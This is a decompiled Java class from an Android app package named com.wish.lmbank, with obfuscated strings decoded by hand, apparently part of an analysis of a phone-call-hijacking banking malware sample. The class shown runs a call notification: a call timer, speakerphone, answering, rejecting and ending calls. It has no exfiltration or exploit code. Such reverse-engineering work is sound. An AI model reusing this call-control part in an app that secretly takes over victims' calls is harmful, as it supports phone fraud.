package com.wish.lmbank.phone.service;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

import com.wish.lmbank.phone.PhoneCallManager;
import com.wish.lmbank.phone.notify.NotifyBean;
import com.wish.lmbank.phone.notify.NotifyView;

import java.io.Serializable;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/phone/service/TeleNotifyService.class */
public class TeleNotifyService extends Service {
    public static int f = -1;
    public Handler c = new Handler();
    public Runnable d = new a(this);
    public NotifyBean mNotifyBean;
    public NotifyView mNotifyView;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        NotifyView notifyView = new NotifyView();
        this.mNotifyView = notifyView;
//         notifyView.c(setAction(bb7d7pu7.m5998("CgUACgJEBAAK")));
        notifyView.c(setAction("click-mic"));
//         this.mNotifyView.b(setAction(bb7d7pu7.m5998("CgUACgJECgYHHQwHHQ")));
        this.mNotifyView.b(setAction("click-content"));
//         this.mNotifyView.d(setAction(bb7d7pu7.m5998("CgUACgJEGQEGBww")));
        this.mNotifyView.d(setAction("click-phone"));
//         this.mNotifyView.e(setAction(bb7d7pu7.m5998("CgUACgJEGgYcBw0")));
        this.mNotifyView.e(setAction("click-sound"));
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent != null) {
//                 Serializable serializableExtra = intent.getSerializableExtra(bb7d7pu7.m5998("PTA5LA"));
            Serializable serializableExtra = intent.getSerializableExtra("TYPE");
            if (serializableExtra instanceof NotifyBean) {
                NotifyBean notifyBean = (NotifyBean) serializableExtra;
                int i3 = notifyBean.b;
                if (i3 == 1) {
                    e();
                    this.mNotifyView.f(this, notifyBean);
                } else if (i3 == 2) {
                    d(notifyBean);
                } else if (i3 == 3) {
                    e();
                    this.mNotifyView.a();
                }
            } else {
                String action = intent.getAction();
//                     if (bb7d7pu7.m5998("Gh0IGx1EHQAEDBs").equals(action)) {
                if ("start-timer".equals(action)) {
                    d(this.mNotifyBean);
                }
//                     if (bb7d7pu7.m5998("Gh0GGUQdAAQMGw").equals(action)) {
                if ("stop-timer".equals(action)) {
                    e();
                }
//                     if (bb7d7pu7.m5998("CgUACgJEGgYcBw0").equals(action)) {
                if ("click-sound".equals(action)) {
                    new PhoneCallManager(this).setSpeaker();
                }
//                     if (bb7d7pu7.m5998("CgUACgJEGQEGBwxEGwwDDAod").equals(action)) {
                if ("click-phone-reject".equals(action)) {
                    disconnect();
                }
//                     if (bb7d7pu7.m5998("CgUACgJEGQEGBwxECAoKDBkd").equals(action)) {
                if ("click-phone-accept".equals(action)) {
                    PhoneCallManager.answer();
                }
            }
        }
        return super.onStartCommand(intent, i, i2);
    }

    private void disconnect() {
        PhoneCallManager.endCall();
    }

    public static String a(int i) {
        if (i == 0) {
//             return bb7d7pu7.m5998("WVlTWVk");
            return "00:00";
        }
        int i2 = i / 3600;
        int i3 = i % 3600;
        int i4 = i3 / 60;
        int i5 = i3 % 60;
//         String m5998 = bb7d7pu7.m5998("Uw");
        String m5998 = ":";
        if (i2 > 0) {
            return c(i2) + m5998 + c(i4) + m5998 + c(i5);
        }
        return c(i4) + m5998 + c(i5);
    }

    private PendingIntent setAction(String str) {
        Intent intent = new Intent(this, TeleNotifyService.class);
        intent.setAction(str);
        return PendingIntent.getService(this, 0, intent, 0);
    }

    public static String c(int i) {
        if (i >= 0 && i < 10) {
            StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("WQ"));
            sb.append("0");
            sb.append(i);
            return sb.toString();
        }
        return String.valueOf(i);
    }

    private void d(NotifyBean notifyBean) {
        e();
        f = 0;
        this.mNotifyBean = notifyBean;
        this.c.post(this.d);
    }

    private void e() {
        if (this.mNotifyBean == null || f == -1) {
            return;
        }
        f = -1;
        this.mNotifyBean = null;
        this.c.removeCallbacks(this.d);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.mNotifyView = null;
    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/phone/service/TeleNotifyService$a.class */
    class a implements Runnable {
        final TeleNotifyService this$0;

        a(TeleNotifyService teleNotifyService) {
            this.this$0 = teleNotifyService;
        }

        @Override // java.lang.Runnable
        public void run() {
            NotifyBean notifyBean;
            int i = TeleNotifyService.f;
            if (i < 0 || (notifyBean = this.this$0.mNotifyBean) == null) {
                return;
            }
            notifyBean.time = TeleNotifyService.a(i);
            TeleNotifyService teleNotifyService = this.this$0;
            teleNotifyService.mNotifyView.f(teleNotifyService, this.this$0.mNotifyBean);
            TeleNotifyService.f++;
            TeleNotifyService teleNotifyService2 = this.this$0;
            teleNotifyService2.c.postDelayed(teleNotifyService2.d, 1000L);
            return;
        }
    }
}
